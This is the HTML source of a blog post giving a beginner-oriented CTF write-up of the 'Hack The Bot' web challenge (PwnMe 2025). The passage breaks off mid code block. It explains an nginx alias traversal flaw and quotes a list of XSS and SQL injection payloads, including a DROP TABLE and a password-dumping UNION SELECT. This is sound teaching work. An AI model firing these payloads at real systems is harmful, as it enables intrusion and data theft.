@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Hack The Bot Writeup for Beginners (PwnMe 2025 CTF) :: elmosalamy | blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Hey! Today we will be exploring Hack The Bot 1 and 2 together, a lovely 2-part web challenge that came up in the recent PwnMe 2025 CTF and had ~11 solves towards the end of the competition." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="//localhost:1313/posts/hack-my-bot-pwnme-2025-ctf/" />
+
+
+
+
+<link rel="stylesheet" href="//localhost:1313/assets/style.css">
+
+  <link rel="stylesheet" href="//localhost:1313/assets/green.css">
+
+
+
+<link rel="stylesheet" href="//localhost:1313/style.css">
+
+
+<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Bot Writeup for Beginners (PwnMe 2025 CTF)">
+<meta property="og:description" content="Hey! Today we will be exploring Hack The Bot 1 and 2 together, a lovely 2-part web challenge that came up in the recent PwnMe 2025 CTF and had ~11 solves towards the end of the competition." />
+<meta property="og:url" content="//localhost:1313/posts/hack-my-bot-pwnme-2025-ctf/" />
+<meta property="og:site_name" content="elmosalamy | blog" />
+
+  <meta property="og:image" content="//localhost:1313/images/hackmybot_index.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2025-03-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [['$$', '$$']],  
+      inlineMath: [['$', '$']]      
+    }
+  };
+</script>
+
+ 
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    elmosalamy
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a target="" href="/posts">📝 Posts</a></li>
+        
+      
+        
+          <li><a target="" href="/tags">🏷️ Tags</a></li>
+        
+      
+        
+          <li><a target="_blank" href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/posts">📝 Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">🏷️ Tags</a></li>
+      
+    
+      
+        <li><a href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/hack-my-bot-pwnme-2025-ctf/">Hack The Bot Writeup for Beginners (PwnMe 2025 CTF)</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2025-03-04 
+      </span>
+    
+    
+    <span class="post-author">:: aelmosalamy</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="//localhost:1313/tags/web/">web</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="//localhost:1313/images/hackmybot_index.png" class="post-cover" alt="Hack The Bot Writeup for Beginners (PwnMe 2025 CTF)" />
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#chapter-1-eagle-view">Chapter 1: Eagle View</a></li>
+    <li><a href="#chapter-2-landing-our-xss">Chapter 2: Landing our XSS</a></li>
+    <li><a href="#chapter-3-xss-delivery">Chapter 3: XSS Delivery</a></li>
+    <li><a href="#chapter-3-bot-control">Chapter 3: Bot Control</a></li>
+    <li><a href="#chapter-3-narrowing-in">Chapter 3: Narrowing In</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>Hey! Today we will be exploring <strong>Hack The Bot 1 and 2</strong> together, a lovely 2-part web challenge that came up in the recent <strong>PwnMe 2025 CTF</strong> and had ~11 solves towards the end of the competition. I solved it with my teammate <strong>@qlashx</strong>.</p>
+<p>I will be covering some of the methodology to approach similar challenges while discussing topics such as Cross-Site Scripting (XSS), Same-origin Policy (SOP), WebSockets and more, trying to be beginner-friendly throughout.</p>
+<h2 id="chapter-1-eagle-view">Chapter 1: Eagle View<a href="#chapter-1-eagle-view" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>First, and since we are given the source code, let&rsquo;s start by exploring the app from a distance.</p>
+<p>The app&rsquo;s directory looks as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>tree .
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── README
+</span></span><span style="display:flex;"><span>├── flag2.txt
+</span></span><span style="display:flex;"><span>├── nginx.conf
+</span></span><span style="display:flex;"><span>└── source
+</span></span><span style="display:flex;"><span>    ├── app.js
+</span></span><span style="display:flex;"><span>    ├── package.json
+</span></span><span style="display:flex;"><span>    ├── public
+</span></span><span style="display:flex;"><span>    │   ├── css
+</span></span><span style="display:flex;"><span>    │   │   └── style.css
+</span></span><span style="display:flex;"><span>    │   └── js
+</span></span><span style="display:flex;"><span>    │       └── script.js
+</span></span><span style="display:flex;"><span>    └── views
+</span></span><span style="display:flex;"><span>        ├── index.ejs
+</span></span><span style="display:flex;"><span>        └── report.ejs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span> directories, <span style="color:#ae81ff">12</span> file
+</span></span></code></pre></div><p>We will start off by checking the <code>Dockerfile</code> provided as it can often tell us many useful information about the target application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> node:18-slim</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#f92672">&amp;&amp;</span> apt-get install -y <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    gconf-service libasound2 libatk1.0-0 libcairo2 libcups2 libfontconfig1 libgdk-pixbuf2.0-0 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    libgtk-3-0 libnspr4 libpango-1.0-0 libxss1 fonts-liberation libappindicator1 libnss3 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    lsb-release xdg-utils wget nginx<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    dpkg -i google-chrome-stable_current_amd64.deb; apt-get -fy install <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    rm google-chrome-stable_current_amd64.deb<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /app /tmp/bot_folder/logs /tmp/bot_folder/browser_cache<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> /source /app<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> flag2.txt /root/<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> nginx.conf /etc/nginx/nginx.conf<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> npm install<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 80</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> service nginx start <span style="color:#f92672">&amp;&amp;</span> node app.js<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Let&rsquo;s see what can we take away from the Dockerfile.</p>
+<ol>
+<li>From the first line, we notice that we have a Node application.</li>
+<li>We notice <code>wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</code> which is used to download Google Chrome, this hints at a potential XSS vulnerability.</li>
+<li>We are setting up two interesting directories <code>/tmp/bot_folder/logs</code> and <code>/tmp/bot_folder/browser_cache</code>. We will keep these in mind.</li>
+<li>We have <code>/root/flag2.txt</code>.</li>
+<li>Our Node application seems to be served through an <strong>nginx</strong> reverse proxy.</li>
+</ol>
+<p>Great! Let&rsquo;s see what <strong>nginx</strong> has to tell us by exploring <code>nginx.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">events{}</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">user</span> <span style="color:#e6db74">root</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">http</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">server</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">listen</span> <span style="color:#ae81ff">80</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">location</span> <span style="color:#e6db74">/</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">proxy_pass</span> <span style="color:#e6db74">http://127.0.0.1:5000</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">location</span> <span style="color:#e6db74">/logs</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">autoindex</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">alias</span> <span style="color:#e6db74">/tmp/bot_folder/logs/</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">try_files</span> $uri $uri/ =<span style="color:#ae81ff">404</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As we move forward with our code review, we should note all the &ldquo;primitives&rdquo; and vulnerabilities we come across as they may always be relevant for us at a later stage of exploitation.</p>
+<p>Looking at the <code>nginx.conf</code>, we can right away spot a very subtle, misconfigured alias. You can read more about this misconfiguration <a href="https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/">here</a> and <a href="https://davidhamann.de/2022/08/14/nginx-alias-traversal/">here</a></p>
+<p>Simply, if we visit <code>/log../a</code>, nginx is going to replace the prefix <code>/log</code> with the alias, yielding <code>/tmp/bot_folder/logs/../a</code>.</p>
+<p>This will then be <em>normalized</em> to <code>/tmp/bot_folder/a</code>, effectively traveling one directory up and reading content inside the <code>bot_folder</code> directory instead of the <code>logs</code> directory as we are expected.</p>
+<p>We still do not know if this is useful to us, so we will keep it in our back pocket.</p>
+<p>Let&rsquo;s jump into the actual app!</p>
+<h2 id="chapter-2-landing-our-xss">Chapter 2: Landing our XSS<a href="#chapter-2-landing-our-xss" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Since we are dealing with a Node application, we can use a nifty feature of <code>npm</code> (Node&rsquo;s package manager) to check for low-hanging fruits and possible vulnerable dependencies. These could give us a quick win:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>npm audit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- snip ---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8</span> vulnerabilities <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> low, <span style="color:#ae81ff">1</span> moderate, <span style="color:#ae81ff">4</span> high<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To address all issues, run:
+</span></span><span style="display:flex;"><span>  npm audit fix
+</span></span></code></pre></div><p><code>npm audit</code> looks at the dependencies in <code>package.json</code> and checks for any reported CVEs or security advisories against them. We get a few hits, but none seem relevant upon inspection.</p>
+<p>Let&rsquo;s move to <code>app.js</code>.  We quickly scan its imports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">spawn</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">puppeteer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;puppeteer&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">format</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;date-fns&#39;</span>);
+</span></span></code></pre></div><p>Nothing fancy, just an Express app. We can also see that <code>puppeteer</code> is brought in, which explains why we saw Google Chrome downloaded in the Dockerfile earlier.</p>
+<p>As with any web application, let&rsquo;s check out its routes as these are often our only entrance  to the application:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#f92672">(</span>req, res<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    res.render<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;index&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">})</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/report&#39;</span>, <span style="color:#f92672">(</span>req, res<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    res.render<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;report&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">})</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app.post<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/report&#39;</span>, <span style="color:#f92672">(</span>req, res<span style="color:#f92672">)</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    const url <span style="color:#f92672">=</span> req.body.url;
+</span></span><span style="display:flex;"><span>    const name <span style="color:#f92672">=</span> format<span style="color:#f92672">(</span>new Date<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#34;yyMMdd_HHmmss&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    startBot<span style="color:#f92672">(</span>url, name<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    res.status<span style="color:#f92672">(</span>200<span style="color:#f92672">)</span>.send<span style="color:#f92672">(</span><span style="color:#e6db74">`</span>logs/<span style="color:#e6db74">${</span>name<span style="color:#e6db74">}</span>.log<span style="color:#e6db74">`</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">})</span>;
+</span></span></code></pre></div><p>Let&rsquo;s check the index page at <code>views/index.ejs</code>:
+<img src="/posts/hack-my-bot-pwnme-2025-ctf/hackmybot_index.png"></p>
+<p>The index page seems to contain a bunch of snippets to perform a variety of attacks. It looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-md-4 article-box&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;article-title&#34;</span>&gt;XSS Injection&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;article-content&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">h5</span>&gt;Payloads&lt;/<span style="color:#f92672">h5</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;&amp;lt;img src=x onerror=print()&amp;gt; &lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;&amp;lt;img src=&#34;javascript:alert(&#39;XSS&#39;)&#34;&amp;gt;&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;&amp;lt;svg/onload=fetch(&#39;https://aa.com&#39;)&amp;gt;&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">h5</span>&gt;No-interactions events&lt;/<span style="color:#f92672">h5</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;onfocus, onstart, onbeforeunload, onhashchange, ontoggle
+</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-md-4 article-box&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;article-title&#34;</span>&gt;SQL Injection&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;article-content&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">h5</span>&gt;Payloads&lt;/<span style="color:#f92672">h5</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;&#39; OR &#39;1&#39;=&#39;1 &lt;/<span style="color:#f92672">li</span>&gt; 
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;&#39;; DROP TABLE users;&lt;/<span style="color:#f92672">li</span>&gt; 
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;&#39; UNION SELECT 1, username, password FROM users -- &lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">h5</span>&gt;Identify backend&lt;/<span style="color:#f92672">h5</span>&gt;
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;sleep(10) #mysql 
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;pg_sleep(10) #Postgresql 
+</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span>&gt;WAITFOR DELAY &#39;0:0:10&#39; # MSQL
+</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>We can notice that it is loading an interesting <code>script.js</code> towards the end:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/js/script.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Exploring the script, we can see basic functionality to handle reports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(document).<span style="color:#a6e22e">ready</span>(<span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#reportForm&#39;</span>).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#urlInput&#39;</span>).<span style="color:#a6e22e">val</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">messageElement</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;#message&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/report&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">url</span> },
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">response</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">messageHtml</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`In progress, you can check logs &lt;a href=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">response</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;style=&#34;color: green; text-decoration: underline;&#34;&gt;here&lt;/a&gt;`</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">messageElement</span>.<span style="color:#a6e22e">html</span>(<span style="color:#a6e22e">messageHtml</span>).<span style="color:#a6e22e">removeClass</span>(<span style="color:#e6db74">&#39;error&#39;</span>).<span style="color:#a6e22e">addClass</span>(<span style="color:#e6db74">&#39;success&#39;</span>);
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">xhr</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">messageElement</span>.<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">&#39;Erreur: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>).<span style="color:#a6e22e">removeClass</span>(<span style="color:#e6db74">&#39;success&#39;</span>).<span style="color:#a6e22e">addClass</span>(<span style="color:#e6db74">&#39;error&#39;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>We notice that jQuery is being used as well as some search functionality. Let&rsquo;s break it down:</p>
+<ol>
+<li>
+<p>We have <code>getSearchQuery</code>, responsible for extracting the <code>?q=</code> search param:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getSearchQuery</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Utiliser une valeur par défaut de chaîne vide si le paramètre n&#39;existe pas
